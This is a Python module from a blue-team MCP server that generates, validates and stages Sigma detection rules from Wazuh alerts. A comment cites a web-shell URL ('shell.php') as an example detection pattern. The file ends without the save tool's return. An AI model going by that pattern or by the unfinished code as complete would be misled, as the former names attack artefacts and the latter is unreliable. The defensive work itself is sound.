#!/usr/bin/env python3
"""
© NAuliajati - TangerangKota-CSIRT
Sigma rule synthesis + validation for blue_team_mcp.

Stage A of the Sigma work. Three tools:
  blueteam_sigma_rule_generate - draft a Sigma rule from a Wazuh alert pattern
                                 or analyst-supplied text.
  blueteam_sigma_rule_validate - schema check, plus a pySigma parse when the
                                 library is installed.
  blueteam_sigma_rule_save     - write a PARSEABLE rule to the staging directory
                                 (BLUETEAM_SIGMA_RULES_DIR). Requires wazuh:write.

Stage B (Sigma -> OpenSearch query / Wazuh XML) is NOT here. See the plan: the
OpenSearch backend is a separate opt-in dependency, and native Wazuh XML authoring
is out of scope for this repository.

These are Wazuh-native Sigma rules, not sigmaHQ-portable ones. Field names in
``detection`` are Wazuh alert fields (``data.url``, ``data.srcip``), so
``logsource.product`` is ``wazuh`` and ``status`` is ``experimental``. That keeps
the provenance honest and the future Indexer conversion correct; upstream
``sigma check`` will warn about the non-standard product, which is expected.

REDACTION CONTRACT (read before changing):
All three tools set ``redact=False``. The default @blueteam_tool pipeline redacts
the RETURN VALUE, which for a Sigma rule means masking the IP/domain/URL literals
inside ``detection``, producing a rule that parses but matches nothing. Silent
false negative. Instead:
  * audit=False + a manual ``_audit_log`` that logs only the rule title + sha256,
    never the rule body.
  * ``mode='alert'`` reads attacker-side fields only (``data.url`` / ``data.domain``
    / ``data.command`` / ``data.file.*``). ``full_log`` is never a value source; it
    carries victim usernames and paths. The harvest already restricts ``_source``.
Nothing raw reaches the audit log, which is what makes redact=False safe here.

pySigma is OPTIONAL. Stage A needs only pyyaml, which is already a transitive
dependency. ``sigma_engine`` imports pySigma lazily; ``blueteam_sigma_rule_validate``
falls back to schema-only and names the stages that actually ran in ``engine``.

NOTE: No ``from __future__ import annotations`` - deferred annotation evaluation
      (PEP 563) breaks @blueteam_tool type resolution.
"""

import hashlib
import json
import logging
import re
import uuid
from datetime import datetime, timezone
from typing import Any, Literal, Optional

import yaml
from pydantic import BaseModel, ConfigDict, Field, model_validator

from mcp_server.core.audit import _audit_log, _truncate_if_needed
from mcp_server.core.config import config
from mcp_server.core.exceptions import BlueTeamMCPError
from mcp_server.core.rule_staging import save_rule_file, short_digest, staging_dir
from mcp_server.core.tool_decorator import blueteam_tool
from mcp_server.sigma import engine as sigma_engine
from mcp_server.wazuh.indexer import (_ATTACKER_CONTEXT_FIELDS, _ATTACKER_FIELDS,
                                      _fetch_attacker_alert_docs, _wazuh_indexer_field_caps,
                                      field_coverage)

logger = logging.getLogger("blue_team_mcp.sigma")

_MAX_TEXT_CHARS = 262144       # 256 KB of rule source accepted by validate
_MAX_VALUES_PER_FIELD = 5      # distinct values emitted per detection field
_MAX_FIELDS = 4                # distinct fields emitted per selection
_FALLBACK_RULES_DIR = "/opt/sigma_rules/sigma_staging"

# Sigma level vocabulary, and the Wazuh rule.level bands they map to. Wazuh
# levels run 0-15; the bands below are the operator-facing severity buckets.
_SIGMA_LEVELS = ("informational", "low", "medium", "high", "critical")
_WAZUH_LEVEL_BANDS: list[tuple[int, str]] = [
    (3, "informational"), (6, "low"), (9, "medium"), (12, "high"), (15, "critical"),
]

# Field -> Sigma modifier. ``|contains`` for free-text attacker values (URLs,
# command lines) because Wazuh decoders truncate and decorate them. Domain and
# file name are exact because the decoder emits them whole. This table is the one
# place a new harvestable field needs a modifier decision.
# KNOWN CEILING, agreed 2026-09-11 and deferred: ``data.url`` as ``|contains``
# emits ``data.url:*\/shell.php*``. A leading wildcard is a per-document scan on
# that field, and a URL carrying a query string (``shell.php?id=1``) matches when
# the exact URL was intended. Prefer ``|endswith`` on a path literal, or keep the
# query string, once the pattern heuristics get a refinement pass against live
# alerts. Do not change this before measuring wildcard cost on the real index.
_FIELD_MODIFIERS: dict[str, str] = {
    "data.url": "contains",
    "data.command": "contains",
    "data.user_agent": "contains",
    "data.domain": "exact",
    "data.file.name": "exact",
    "data.file.path": "endswith",
    "data.srcip": "exact",
}

# Harvest order. Earlier fields are more specific to the attacker, so they win
# when the field cap is reached.
_HARVEST_ORDER: list[str] = [
    "data.url", "data.domain", "data.command", "data.file.name",
    "data.file.path", "data.srcip",
]

# Wazuh decoder / rule group -> Sigma logsource category. First match wins.
_LOGSAMPLE_CATEGORY: list[tuple[str, str]] = [
    ("web", "webserver"), ("nginx", "webserver"), ("apache", "webserver"),
    ("iis", "webserver"), ("proxy", "proxy"), ("squid", "proxy"),
    ("firewall", "firewall"), ("iptables", "firewall"), ("windows", "windows"),
    ("sysmon", "windows"), ("syscheck", "file_event"), ("audit", "linux"),
    ("sshd", "linux"), ("postfix", "mail"), ("zimbra", "mail"),
    ("dns", "dns"), ("suricata", "network"), ("ids", "network"),
]

# Values too generic to be a detection value. Emitting one of these as an exact
# match would make the rule fire on everything.
_GENERIC_VALUES = {
    "index", "index.html", "/", "-", "unknown", "none", "null", "get", "post",
    "http/1.1", "http/1.0", "application/json", "text/html",
}

_VALID_STATUSES = ("experimental", "test", "stable", "deprecated")
_UUID_RE = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
                      r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
_TECHNIQUE_RE = re.compile(r"^T\d{4}(\.\d{3})?$", re.IGNORECASE)
_TITLE_RE = re.compile(r"^\s*title\s*:\s*(.+?)\s*$", re.MULTILINE)


class SigmaEngineError(BlueTeamMCPError):
    """Raised when an optional Sigma engine (pySigma) is present but fails."""


# pySigma. The import boundary lives in mcp_server.sigma.engine; this
# module only asks it whether it is available.
def _pysigma_available() -> bool:
    """True when pySigma and the OpenSearch backend are importable."""
    return sigma_engine.available()


def _pysigma_parse(rule_source: str) -> tuple[bool, list[str]]:
    """Parse ``rule_source`` with pySigma. Returns (ok, messages).
    ``ok=True`` with a message when pySigma is absent, so the caller can report
    a schema-only result rather than an error.
    """
    return sigma_engine.parse_check(rule_source)


# Value harvesting + ranking.
def _is_usable_value(v: Any) -> bool:
    """True when a harvested string is specific enough to be a detection value."""
    if not isinstance(v, str):
        return False
    v = v.strip()
    if not (3 <= len(v) <= 200):
        return False
    if v.lower() in _GENERIC_VALUES:
        return False
    # A single repeated character ("////") carries no signal.
    return len(set(v)) > 1


def _harvest_values(docs: list[dict], cap: int = _MAX_VALUES_PER_FIELD) -> dict[str, list[str]]:
    """Collect distinct, usable values per field, in deterministic order."""
    collected: dict[str, list[str]] = {}
    for field in _HARVEST_ORDER:
        seen: set[str] = set()
        values: list[str] = []
        for doc in docs:
            node: Any = doc
            for part in field.split("."):
                node = node.get(part) if isinstance(node, dict) else None
                if node is None:
                    break
            if not _is_usable_value(node):
                continue
            v = node.strip()
            if v in seen:
                continue
            seen.add(v)
            values.append(v)
            if len(values) >= cap:
                break
        if values:
            collected[field] = values
    return collected


def _select_fields(values: dict[str, list[str]], cap: int = _MAX_FIELDS) -> dict[str, list[str]]:
    """Keep the most specific fields, up to ``cap``."""
    ordered = [f for f in _HARVEST_ORDER if f in values]
    return {f: values[f] for f in ordered[:cap]}


def _derive_level(docs: list[dict]) -> str:
    """Map the highest observed Wazuh rule.level to a Sigma level."""
    levels: list[float] = []
    for doc in docs:
        lvl = (doc.get("rule") or {}).get("level")
        if isinstance(lvl, (int, float)):
            levels.append(float(lvl))
    if not levels:
        return "medium"
    top = max(levels)
    for bound, name in _WAZUH_LEVEL_BANDS:
        if top <= bound:
            return name
    return "critical"


def _derive_category(docs: list[dict], override: Optional[str]) -> str:
    """Derive a Sigma logsource category from decoder and rule groups."""
    if override:
        return override
    tokens: list[str] = []
    for doc in docs:
        for key in ("decoder.name",):
            node = doc.get(key.split(".")[0])
            if isinstance(node, dict):
                v = node.get(key.split(".", 1)[1])
                if isinstance(v, str):
                    tokens.append(v.lower())
        groups = (doc.get("rule") or {}).get("groups")
        if isinstance(groups, list):
            tokens.extend(str(g).lower() for g in groups)
        elif isinstance(groups, str):
            tokens.append(groups.lower())
    for needle, category in _LOGSAMPLE_CATEGORY:
        if any(needle in t for t in tokens):
            return category
    return "application"


def _derive_tags(docs: list[dict]) -> list[str]:
    """ATT&CK technique tags from the observed ``rule.mitre.id`` values."""
    techniques: set[str] = set()
    for doc in docs:
        mid = (doc.get("rule") or {}).get("mitre", {})
        ids = mid.get("id") if isinstance(mid, dict) else None
        if isinstance(ids, str):
            ids = [ids]
        for t in ids or []:
            if isinstance(t, str) and _TECHNIQUE_RE.match(t.strip()):
                techniques.add(t.strip().upper())
    return [f"attack.{t.lower()}" for t in sorted(techniques)]


def _source_rule_ids(docs: list[dict]) -> list[str]:
    """Distinct Wazuh rule ids the alerts fired under (provenance + dedup hint)."""
    ids: set[str] = set()
    for doc in docs:
        rid = (doc.get("rule") or {}).get("id")
        if isinstance(rid, (str, int)):
            ids.add(str(rid))
    return sorted(ids)


def _derive_title(selections: dict[str, list[str]], category: str) -> str:
    """Human-readable title from the strongest selection value."""
    if not selections:
        return f"Wazuh pattern - {category} (no attacker-side values harvested)"
    field, values = next(iter(selections.items()))
    short = field.split(".")[-1].replace("_", " ")
    sample = values[0]
    if len(sample) > 48:
        sample = sample[:45] + "..."
    return f"Wazuh {short} pattern: {sample}"[:200]


def _slug(title: str, digest: str) -> str:
    """Filesystem-safe rule filename stem."""
    s = re.sub(r"[^A-Za-z0-9]+", "_", title).strip("_")[:80] or "sigma_draft"
    return f"sigma_{s}_{digest}"


# Rendering.
def _build_rule(docs: list[dict], params: "SigmaRuleGenerateInput",
                values: dict[str, list[str]]) -> tuple[str, dict]:
    """Assemble the Sigma YAML. Returns (rule_source, diagnostics)."""
    selections = _select_fields(values)
    category = _derive_category(docs, params.logsource_category)
    level = params.level or _derive_level(docs)
    title = params.title or _derive_title(selections, category)
    rule_ids = _source_rule_ids(docs)
    tags = _derive_tags(docs)

    selection: dict[str, Any] = {}
    for field, vals in selections.items():
        modifier = _FIELD_MODIFIERS.get(field, "contains")
        key = field if modifier == "exact" else f"{field}|{modifier}"
        selection[key] = vals[0] if len(vals) == 1 else vals
    if not selection:
        # Sigma requires a named selection the condition can reference. An empty
        # one would produce a rule that matches nothing, so the placeholder makes
        # the gap visible in the rule body instead of hiding it.
        selection = {"data.url|contains": "__NO_ATTACKER_VALUE_HARVESTED__"}

    provenance = (
        f"Draft from {len(docs)} Wazuh alerts"
        + (f" (rule.id {', '.join(rule_ids)})" if rule_ids else "")
        + f". Srcip={params.srcip or 'n/a'}, rule_id={params.rule_id or 'n/a'}, "
          f"since={params.since}. coverage=draft."
    )

    payload: dict[str, Any] = {
        "title": title,
        "id": str(uuid.uuid4()),
        "status": "experimental",
        "description": provenance,
        "author": "TangerangKota-CSIRT",
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
    }
    if tags:
        payload["tags"] = tags
    payload["logsource"] = {"product": "wazuh", "category": category}
    payload["detection"] = {"selection": selection, "condition": "selection"}
    payload["falsepositives"] = ["Unknown"]
    payload["level"] = level

    text = yaml.safe_dump(payload, sort_keys=False, default_flow_style=False,
                          allow_unicode=True, width=100)
    diagnostics = {
        "selections": selections,
        "logsource_category": category,
        "level": level,
        "tags": tags,
        "source_rule_ids": rule_ids,
        "harvested_fields": list(values.keys()),
    }
    return text, diagnostics


def _schema_of(rule_source: str) -> tuple[Optional[dict], list[str]]:
    """Parse rule_source as YAML. Returns (doc|None, errors)."""
    try:
        doc = yaml.safe_load(rule_source)
    except yaml.YAMLError as e:
        return None, [f"YAML parse error: {str(e)[:300]}"]
    if not isinstance(doc, dict):
        return None, ["Rule source is not a YAML mapping"]
    return doc, []


def _static_checks(doc: dict, unmapped_fields: Optional[list[str]] = None) -> list[str]:
    """Sigma quality findings. Cheap structural subset, no full model validation."""
    findings: list[str] = []

    title = doc.get("title")
    if not isinstance(title, str) or len(title.strip()) < 8:
        findings.append("SG1 title: missing or shorter than 8 characters")
    status = doc.get("status")
    if status is not None and status not in _VALID_STATUSES:
        findings.append(f"SG2 status: {status!r} not in {list(_VALID_STATUSES)}")
    rid = doc.get("id")
    if rid is not None and not (isinstance(rid, str) and _UUID_RE.match(rid)):
        findings.append("SG3 id: not a UUID regenerate the rule to get one")
    level = doc.get("level")
    if level is None:
        findings.append("SG4 level: missing triage priority is undefined")
    elif level not in _SIGMA_LEVELS:
        findings.append(f"SG4 level: {level!r} not in {list(_SIGMA_LEVELS)}")

    tags = doc.get("tags") or []
    if not any(str(t).startswith("attack.") for t in tags):
        findings.append("SG5 tags: no ATT&CK technique tag")

    logsource = doc.get("logsource")
    if not isinstance(logsource, dict) or not logsource:
        findings.append("SG6 logsource: missing - the rule has no data scope")
    elif logsource.get("product") != "wazuh":
        findings.append(f"SG6 logsource.product: {logsource.get('product')!r} is not 'wazuh'; "
                        "field names below are Wazuh alert fields")

    detection = doc.get("detection")
    if not isinstance(detection, dict) or not detection:
        findings.append("SG7 detection: missing or empty")
    else:
        condition = detection.get("condition")
        if not condition:
            findings.append("SG7 detection.condition: missing")
        else:
            identifiers = set(re.findall(r"[A-Za-z_][A-Za-z0-9_]*", str(condition)))
            defined = {k for k in detection if k != "condition"}
            unknown = identifiers - defined - {"and", "or", "not", "all", "of", "them",
                                               "any", "1", "of", "them"}
            if not (identifiers & defined):
                findings.append(f"SG7 detection.condition references {sorted(unknown)} "
                                f"but the rule defines {sorted(defined)}")
        for key, val in detection.items():
            if key == "condition":
                continue
            if not isinstance(val, (str, int, float, list, dict)):
                findings.append(f"SG8 detection.{key}: unsupported value type "
                                f"{type(val).__name__}")
    if unmapped_fields:
        findings.append(f"SG9 fields not present in the index mapping: "
                        f"{sorted(unmapped_fields)} Wazuh will never match these")
    return findings


# Existing-rule check (Manager API, no cross-tool import so gating still works).
async def _existing_rule_matches(docs: list[dict]) -> list[dict]:
    """Search the Wazuh Manager for rules whose description overlaps the alerts.
    Advisory only. A rule derived from alerts that already fired is by
    construction covered by the source rules, so this reports what already
    exists rather than blocking the draft.
    """
    names: list[str] = []
    for doc in docs:
        desc = (doc.get("rule") or {}).get("description")
        if isinstance(desc, str) and 4 <= len(desc) <= 120:
            names.append(desc)
    if not names:
        return []
    from mcp_server.wazuh.auth import _wazuh_api_get
    from mcp_server.core.config import config as _cfg

    if _cfg is None or not _cfg.wazuh_manager.url:
        return []
    try:
        data = await _wazuh_api_get("/rules", {"search": names[0], "limit": "5"})
    except BlueTeamMCPError:
        raise
    except Exception as e:  # advisory check must never fail the draft
        logger.warning("existing-rule check failed: %s", e)
        return []
    items = ((data or {}).get("data") or {}).get("affected_items") or []
    return [{"id": str(i.get("id", "")), "description": i.get("description", ""),
             "level": i.get("level"), "groups": i.get("groups")}
            for i in items[:5]]


def _rules_dir():
    """Sigma staging directory from config, with a safe fallback."""
    return staging_dir("sigma", _FALLBACK_RULES_DIR)


# Input models.
class SigmaRuleGenerateInput(BaseModel):
    """Input for blueteam_sigma_rule_generate.
    Mode determines the pattern source:
        'alert' - Wazuh Indexer alerts for a srcip and/or rule id (draft fidelity)
        'text'  - raw text supplied by the analyst
    There is no 'file' mode. Stage A does not read a local Sigma corpus; add one
    when a directory of existing rules actually needs ingesting.

    Args:
        mode: 'alert' or 'text'.
        srcip: Source IP filter for mode='alert'.
        rule_id: Wazuh rule id filter for mode='alert'.
        since: Relative or ISO time window for mode='alert' (e.g. '24h').
        limit: Max alert documents to harvest in mode='alert'.
        text: Required for mode='text'.
        title: Overrides the derived rule title.
        level: Sigma level; default is derived from the highest Wazuh rule.level seen.
        logsource_category: Sigma logsource category; default is derived from
            decoder.name and rule.groups.
        verify_fields: Probe the Indexer for every emitted field and report the
            unmapped ones (SG9 finding). Keep True.
        check_existing: Search the Wazuh Manager for rules already covering the
            observed descriptions. Keep True.
        response_format: 'markdown' (default) or 'json'.
        bypass_character_limit: Allow the response past BLUETEAM_CHARACTER_LIMIT.
    """

    model_config = ConfigDict(str_strip_whitespace=True, extra="forbid")

    mode: Literal["alert", "text"] = Field(default="text")
    srcip: Optional[str] = Field(default=None, max_length=45)
    rule_id: Optional[str] = Field(default=None, max_length=64)
    since: str = Field(default="24h", max_length=24)
    limit: int = Field(default=200, ge=1, le=1000)
    text: Optional[str] = Field(default=None, max_length=_MAX_TEXT_CHARS)
    title: Optional[str] = Field(default=None, max_length=200)
    level: Optional[Literal["informational", "low", "medium", "high", "critical"]] = None
    logsource_category: Optional[str] = Field(default=None, max_length=64)
    verify_fields: Optional[bool] = Field(default=None)
    check_existing: Optional[bool] = Field(default=None)
    response_format: Literal["markdown", "json"] = Field(default="markdown")
    bypass_character_limit: bool = Field(default=False)

    @model_validator(mode="after")
    def _require_source(self) -> "SigmaRuleGenerateInput":
        if self.mode == "alert" and not (self.srcip or self.rule_id):
            raise ValueError("mode='alert' requires srcip and/or rule_id")
        if self.mode == "text" and not self.text:
            raise ValueError("mode='text' requires text")
        return self


class SigmaRuleValidateInput(BaseModel):
    """Input for blueteam_sigma_rule_validate.
    Two stages. Stage 1 is a local YAML + schema check and always runs. Stage 2 is
    a pySigma parse and runs only when pySigma is installed. The ``engine`` field in
    the response names the stages that actually ran.

    Args:
        rule_source: Sigma YAML to check.
        error_on_warning: Treat quality findings as failures. Parse errors are
            always fatal, so a rule that reaches staging is known-parseable.
        response_format: 'markdown' (default) or 'json'.
        bypass_character_limit: Allow the response past BLUETEAM_CHARACTER_LIMIT.
    """

    model_config = ConfigDict(str_strip_whitespace=True, extra="forbid")

    rule_source: str = Field(min_length=1, max_length=_MAX_TEXT_CHARS)
    error_on_warning: bool = Field(default=False)
    response_format: Literal["markdown", "json"] = Field(default="markdown")
    bypass_character_limit: bool = Field(default=False)


class SigmaRuleSaveInput(BaseModel):
    """Input for blueteam_sigma_rule_save.
    Writes to the staging directory only (BLUETEAM_SIGMA_RULES_DIR). A SOC Engineer
    must promote the file; this tool never touches a live rules path.

    Args:
        rule_source: Sigma YAML. Must parse and pass the schema check, or the save
            is refused.
        filename: Optional .yml filename. Defaults to <slug(title)>_<digest>.yml.
        overwrite: Replace an existing file. Default False.
        response_format: 'markdown' (default) or 'json'.
        bypass_character_limit: Allow the response past BLUETEAM_CHARACTER_LIMIT.
    """

    model_config = ConfigDict(str_strip_whitespace=True, extra="forbid")

    rule_source: str = Field(min_length=1, max_length=_MAX_TEXT_CHARS)
    filename: Optional[str] = Field(default=None, max_length=120)
    overwrite: bool = Field(default=False)
    response_format: Literal["markdown", "json"] = Field(default="markdown")
    bypass_character_limit: bool = Field(default=False)


class SigmaRuleConvertInput(BaseModel):
    """Input for blueteam_sigma_rule_convert.
    Converts Sigma YAML into an OpenSearch artifact aimed at the Wazuh index.
    These are Wazuh-native rules, so the default output targets
    ``wazuh-alerts-*`` rather than the pySigma default ``beats-*``.
    Stage B converts to OpenSearch only. Sigma to native Wazuh XML rules is out
    of scope for this repository.

    Args:
        rule_source: Sigma YAML, one rule or a collection.
        output_format: 'lucene' (query string for Discover/OpenSearch Dashboards),
            'dsl' (an OpenSearch _search body), 'monitor' (a Dashboards alerting
            monitor), or 'saved_search' (a Dashboards saved search).
        index_pattern: Index the artifact targets. Defaults to
            BLUETEAM_SIGMA_INDEX_PATTERN ('wazuh-alerts-*').
        monitor_interval: Minutes between monitor runs. Defaults to
            BLUETEAM_SIGMA_MONITOR_INTERVAL (5).
        verify_fields: Probe the Indexer for fields the index does not map.
        response_format: 'markdown' (default) or 'json'.
        bypass_character_limit: Allow the response past BLUETEAM_CHARACTER_LIMIT.
    """

    model_config = ConfigDict(str_strip_whitespace=True, extra="forbid")

    rule_source: str = Field(min_length=1, max_length=_MAX_TEXT_CHARS)
    output_format: Literal["lucene", "dsl", "monitor", "saved_search"] = Field(default="lucene")
    index_pattern: Optional[str] = Field(default=None, max_length=128)
    monitor_interval: Optional[int] = Field(default=None, ge=1, le=1440)
    verify_fields: Optional[bool] = Field(default=None)
    response_format: Literal["markdown", "json"] = Field(default="markdown")
    bypass_character_limit: bool = Field(default=False)


# Tools.
@blueteam_tool(
    name="blueteam_sigma_rule_validate",
    annotations={"readOnlyHint": True, "destructiveHint": False,
                 "idempotentHint": True, "openWorldHint": False},
    audit=False, truncate=True, redact=False,
)
async def blueteam_sigma_rule_validate(params: SigmaRuleValidateInput) -> str:
    """Validate a Sigma rule: YAML + schema always, pySigma parse when installed.
    Read-only. No network, no filesystem access. Nothing is executed.
    Wazuh target: none. This tool touches no Wazuh API. Indexer unmapped-field
    checking happens in blueteam_sigma_rule_generate, which has the alert context.

    Args:
        params.rule_source: Sigma YAML to check.
        params.error_on_warning: Fail when quality findings are present.
        params.response_format: 'markdown' (default) or 'json'.

    Returns:
        markdown or json with valid (bool), errors, findings, engine,
        pysigma_available, rule_title.

    Examples:
        1. blueteam_sigma_rule_validate(rule_source=<generated draft>) -> valid=true,
           engine="schema+pysigma" when pySigma is installed, "schema-only" otherwise.
        2. A draft with no ATT&CK tag reports finding SG5, and valid is still true.
        3. A draft whose condition names an undefined selection reports SG7 and
           valid=false.

    Permissions: none. Rate limits: none (local CPU only).
    """
    doc, errors = _schema_of(params.rule_source)
    findings: list[str] = []
    if doc is not None:
        findings = _static_checks(doc)

    pysigma_available = _pysigma_available()
    sigma_ok, sigma_msgs = (True, [])
    if doc is not None:
        sigma_ok, sigma_msgs = _pysigma_parse(params.rule_source)
        errors.extend(sigma_msgs if not sigma_ok else [])
    if params.error_on_warning and findings:
        errors.append(f"findings treated as errors: {findings[0]}")

    title = (doc or {}).get("title") if doc else None
    if isinstance(title, str):
        rule_title: Optional[str] = title
    else:
        m = _TITLE_RE.search(params.rule_source)
        rule_title = m.group(1).strip('"\'') if m else None

    engine = "schema+pysigma" if (pysigma_available and not sigma_msgs) else "schema-only"
    _audit_log("blueteam_sigma_rule_validate", {
        "rule_title": rule_title or "unknown",
        "sha256": hashlib.sha256(params.rule_source.encode()).hexdigest()[:16],
    })
    payload = {
        "valid": not errors,
        "rule_title": rule_title,
        "errors": errors,
        "findings": findings,
        "engine": engine,
        "pysigma_available": pysigma_available,
    }
    if params.response_format == "json":
        return _truncate_if_needed(json.dumps(payload, indent=2),
                                   bypass=params.bypass_character_limit)

    status = "PASSED" if payload["valid"] else "FAILED"
    lines = [f"## Sigma validation: {status}", "",
             f"Rule: `{rule_title or 'unknown'}` | engine: **{engine}**", ""]
    if not pysigma_available:
        lines += ["> pySigma is not installed. Only the schema stage ran; "
                  "install pySigma for a full parse check.", ""]
    if errors:
        lines += ["**Errors**"] + [f"- {e}" for e in errors] + [""]
    if findings:
        lines += ["**Quality findings**"] + [f"- {f}" for f in findings] + [""]
    if payload["valid"] and not findings:
        lines.append("Parses clean; no findings.")
    return _truncate_if_needed("\n".join(lines), bypass=params.bypass_character_limit)


@blueteam_tool(
    name="blueteam_sigma_rule_generate",
    annotations={"readOnlyHint": True, "destructiveHint": False,
                 "idempotentHint": True, "openWorldHint": False},
    audit=False, truncate=True, redact=False,
)
async def blueteam_sigma_rule_generate(params: SigmaRuleGenerateInput) -> str:
    """Generate a Sigma rule draft from a Wazuh alert pattern or analyst text.

    Wazuh target: mode='alert' reads the **Indexer API** (wazuh-alerts-* via
    _fetch_attacker_alert_docs). The Manager API is used only for the advisory
    check_existing lookup. No rule is written by this tool.

    Output is a Wazuh-native Sigma rule: ``logsource.product: wazuh`` and Wazuh
    alert field names in ``detection``. It is not sigmaHQ-portable.

    Coverage levels (never claim more than the data supports):
        draft     - alert/text mode, values harvested from logs or text.
        no-values - nothing usable was harvested; the detection block carries a
                    placeholder and the rule must not be deployed.

    Args:
        params.mode: 'alert' | 'text'.
        params.srcip / params.rule_id / params.since / params.limit: alert filters.
        params.text: Raw text (mode='text').
        params.title: Override the derived title.
        params.level: Override the derived Sigma level.
        params.logsource_category: Override the derived logsource category.
        params.verify_fields: Probe the Indexer for unmapped fields (SG9).
        params.check_existing: Search the Manager for overlapping rules.
        params.response_format: 'markdown' (default) or 'json'.

    Returns:
        markdown with the rule in a ```yaml block, or json with rule_source,
        coverage, diagnostics, validation, findings, field_coverage,
        unmapped_fields, existing_rules.

    Examples:
        1. alert mode, srcip='203.0.113.9', since='24h' -> URL-pattern rule,
           coverage=draft, tags from rule.mitre.id.
        2. text mode on a suspicious one-liner -> draft rule from the supplied values.
        3. alert mode on an IP whose alerts carry no attacker-side fields ->
           coverage=no-values plus a 0-coverage diagnostic.

    Permissions: read on the Wazuh Indexer, read on the Wazuh Manager rules API.
    Rate limits: one bounded Indexer search, one field_caps probe, one Manager
    search. All are cached or single-shot per call.
    """
    docs: list[dict] = []
    values: dict[str, list[str]] = {}
    coverage: Optional[dict] = None
    text_mode = params.mode == "text"

    if text_mode:
        raw = (params.text or "").encode("utf-8", "ignore")
        # Parse the text as a single pseudo-document so the same harvest path runs.
        doc = {"data": {"command": params.text or ""}}
        docs = [doc]
        values = _harvest_values(docs)
        if not values:
            values = {"data.command": [(params.text or "")[:200]]}
    else:
        if not params.srcip and not params.rule_id:
            raise BlueTeamMCPError("mode='alert' requires srcip and/or rule_id")
        docs = await _fetch_attacker_alert_docs(
            params.srcip, params.rule_id, params.since, params.limit)
        if not docs:
            raise BlueTeamMCPError(
                "No alerts matched the given srcip/rule_id/since window")
        coverage = field_coverage(docs, list(_ATTACKER_FIELDS))
        values = _harvest_values(docs)

    rule_source, diagnostics = _build_rule(docs, params, values)
    coverage_tag = "draft" if values else "no-values"

    verify_fields = (params.verify_fields if params.verify_fields is not None
                     else (config.sigma.verify_fields if config else True))
    check_existing = (params.check_existing if params.check_existing is not None
                      else (config.sigma.check_existing if config else True))

    unmapped: list[str] = []
    if verify_fields and diagnostics["selections"]:
        caps = await _wazuh_indexer_field_caps(list(diagnostics["selections"].keys()))
        if caps:
            unmapped = [f for f in diagnostics["selections"] if f not in caps]

    existing: list[dict] = []
    if check_existing and not text_mode:
        existing = await _existing_rule_matches(docs)

    doc, errors = _schema_of(rule_source)
    if doc is None:
        coverage_tag = "invalid"
    findings = _static_checks(doc, unmapped) if doc is not None else []
    sigma_ok, sigma_msgs = _pysigma_parse(rule_source)
    if not sigma_ok:
        errors.append(sigma_msgs[0])

    digest = short_digest(rule_source)
    rule_title = (doc or {}).get("title")
    _audit_log("blueteam_sigma_rule_generate", {
        "mode": params.mode,
        "rule_title": rule_title if isinstance(rule_title, str) else "unknown",
        "coverage": coverage_tag,
        "rule_sha256": hashlib.sha256(rule_source.encode()).hexdigest()[:16],
    })

    payload = {
        "rule_title": rule_title,
        "rule_source": rule_source,
        "coverage": coverage_tag,
        "diagnostics": diagnostics,
        "validation": {"valid": not errors, "errors": errors},
        "findings": findings,
        "field_coverage": coverage,
        "unmapped_fields": unmapped,
        "verify_ran": bool(verify_fields and diagnostics["selections"]),
        "existing_rules": existing,
        "pysigma_available": _pysigma_available(),
    }
    if params.response_format == "json":
        return _truncate_if_needed(json.dumps(payload, indent=2),
                                   bypass=params.bypass_character_limit)

    lines = [f"## Sigma rule: `{rule_title or 'untitled'}`", "",
             f"Coverage: **{coverage_tag}** | valid: {not errors} | "
             f"fields: {len(diagnostics['selections'])}", ""]
    if coverage_tag == "draft":
        lines += ["> Draft quality: derived from logs, not from a validated "
                  "detection requirement. Review the field modifiers before "
                  "deploying.", ""]
    elif coverage_tag == "no-values":
        lines += ["> No usable attacker-side value was harvested. The detection "
                  "block carries a placeholder and this rule matches nothing. "
                  "Do not deploy.", ""]
    lines += ["```yaml", rule_source.rstrip(), "```", ""]
    if errors:
        lines += ["**Errors**"] + [f"- {e}" for e in errors] + [""]
    if findings:
        lines += ["**Quality findings**"] + [f"- {f}" for f in findings] + [""]
    if coverage is not None:
        populated = [f for f, n in coverage.items() if n]
        lines += [f"**Alert field coverage**: {coverage}", ""]
        if not populated:
            lines += ["> No harvested field was populated in any matched alert. "
                      "Check the deployment's decoder field paths before trusting "
                      "this draft.", ""]
    if unmapped:
        lines += [f"**Unmapped fields** (never matched by Wazuh): {unmapped}", ""]
    if existing:
        lines += ["**Existing Manager rules on this description**"] + [
            f"- {r['id']} (level {r['level']}): {r['description']}" for r in existing
        ] + [""]
    return _truncate_if_needed("\n".join(lines), bypass=params.bypass_character_limit)


@blueteam_tool(
    name="blueteam_sigma_rule_save",
    annotations={"readOnlyHint": False, "destructiveHint": False,
                 "idempotentHint": True, "openWorldHint": False},
    audit=False, truncate=True, redact=False,
)
async def blueteam_sigma_rule_save(params: SigmaRuleSaveInput) -> str:
    """Save a validated Sigma rule to the staging directory for human review.

    Writes only under BLUETEAM_SIGMA_RULES_DIR (default
    /opt/sigma_rules/sigma_staging). Never writes to a live rules path. Requires
    the ``wazuh:write`` scope on the streamable_http transport (derived
    automatically because readOnlyHint=False).

    Wazuh target: none. No Wazuh API call.

    Args:
        params.rule_source: Sigma YAML. A schema failure or an unparseable source
            aborts the save.
        params.filename: Optional .yml filename; defaults to
            <slug(title)>_<digest>.yml.
        params.overwrite: Replace an existing staging file.
        params.response_format: 'markdown' (default) or 'json'.

    Returns:
        markdown or json with saved=true, path, rule_title, bytes, valid=true.

    Examples:
        1. Save a generated draft -> path under BLUETEAM_SIGMA_RULES_DIR.
        2. Saving the same filename twice without overwrite=true returns an error.
        3. A source that is not a YAML mapping is rejected before any file is written.

    Permissions: write on BLUETEAM_SIGMA_RULES_DIR. Rate limits: none.
    """
    doc, errors = _schema_of(params.rule_source)
    if doc is None:
        raise BlueTeamMCPError(
            f"Refusing to save an unparseable rule: {errors[0] if errors else 'yaml error'}")
    missing = [k for k in ("title", "logsource", "detection") if k not in doc]
    if missing:
        raise BlueTeamMCPError(
            f"Refusing to save a rule missing required key(s): {missing}")

    title = doc.get("title") if isinstance(doc.get("title"), str) else "untitled"
    digest = short_digest(params.rule_source)
    filename = params.filename or f"{_slug(title, digest)}.yml"
    target = save_rule_file(params.rule_source, filename, params.overwrite,
                            _rules_dir(), ".yml")

